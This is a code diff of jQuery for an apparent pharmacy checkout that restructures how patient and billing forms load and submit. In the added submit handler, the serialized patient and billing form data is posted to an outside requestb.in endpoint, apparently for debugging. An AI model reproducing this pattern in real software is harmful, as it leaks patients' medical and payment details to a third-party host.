@@ -10,67 +10,61 @@ function load() {
     this._wp_http_referer.value = "/account/orders"
   })
 
-  if ( ~ jQuery('.woocommerce-MyAccount-content').text().indexOf('No order')) {
-    jQuery.ajax({
-      url:medicationGsheet,
-      type: 'GET',
-      cache:true,
-      success:function($data) {
-        console.log('medications gsheet', $data.feed.entry)
-        var medications = $data.feed.entry.map(medication2select)
-        upgradeMedication(medications)
-      }
-    })
+  if ( ! ~ jQuery('.woocommerce-MyAccount-content').text().indexOf('No order'))
+    return
 
-    jQuery.ajax({
-      url:pharmacyGsheet,
-      type: 'GET',
-      cache:true,
-      success:function($data) {
-        var pharmacies = $data.feed.entry.map(pharmacy2select)
-        upgradePharmacy(pharmacies)
-      }
-    })
+  jQuery.ajax({
+    url:medicationGsheet,
+    type: 'GET',
+    cache:true,
+    success:function($data) {
+      console.log('medications gsheet', $data.feed.entry)
+      var medications = $data.feed.entry.map(medication2select)
+      upgradeMedication(medications)
+    }
+  })
 
-    jQuery('.new-patient').show()
-    jQuery('form.checkout').show()
+  jQuery.ajax({
+    url:pharmacyGsheet,
+    type: 'GET',
+    cache:true,
+    success:function($data) {
+      var pharmacies = $data.feed.entry.map(pharmacy2select)
+      upgradePharmacy(pharmacies)
+    }
+  })
 
-    jQuery("input[name='source']").change(function($event){
-      jQuery('label#eRX').toggle()
-      jQuery('label#transfer').toggle()
-    })
+  jQuery('.new-patient').show()
+  jQuery('form.checkout').show()
 
-    jQuery('#billing_state').prop('disabled', true)
-    jQuery('<input>').attr({type:'hidden', name:'billing_state', value:'GA'}).appendTo('form.checkout');
+  jQuery("input[name='source']").change(function($event){
+    jQuery('label#eRX').toggle()
+    jQuery('label#transfer').toggle()
+  })
 
-    jQuery("input[name='language']:eq(3)").on('click', function($event){
-      jQuery("input[name='language']:eq(2)").prop('checked', true)
-    })
+  jQuery('#billing_state').prop('disabled', true)
+  jQuery('<input>').attr({type:'hidden', name:'billing_state', value:'GA'}).appendTo('form.checkout');
 
-    jQuery('#wc-stripe-new-payment-method').prop('checked', true)
+  jQuery("input[name='language']:eq(3)").on('click', function($event){
+    jQuery("input[name='language']:eq(2)").prop('checked', true)
+  })
 
+  jQuery('#wc-stripe-new-payment-method').prop('checked', true)
+
+  //Do this because an ajax request here fires before validation is complete
+  setTimeout(submit, 1000)
+
+  function submit() {
     jQuery('form.checkout').submit(function(e) {
       console.log('form.checkout 1')
-      jQuery.post('https://requestb.in/1et2h7e1?req=1', {data:window.location.search})
+      if ( ! submit.twice)
+        return submit.twice = true
+      console.log('form.checkout 2')
       var patient  = jQuery('form.new-patient').serialize()
       var billing  = jQuery('form.checkout').serialize()
-      this.billing_state.value = 'GA'
-      //Do this because an ajax request here fires before validation is complete
-      this._wp_http_referer.value = "/account/orders?checkout=success&"+patient+'&'+billing
+
+      jQuery.post('https://requestb.in/1et2h7e1?req=1', {data:patient+'&'+billing})
     })
-
-    if ( ~ window.location.search.indexOf('checkout=success')) {
-      jQuery.post('https://requestb.in/1et2h7e1', {data:window.location.search})
-      console.log('sent order via ajax', window.location.search)
-    }
-
-    setTimeout(function() {
-      jQuery('form.checkout').submit(function(e) {
-        console.log('form.checkout 2')
-        jQuery.post('https://requestb.in/1et2h7e1?req=2', {data:window.location.search})
-      })
-    }, 2000)
-
   }
 }
 
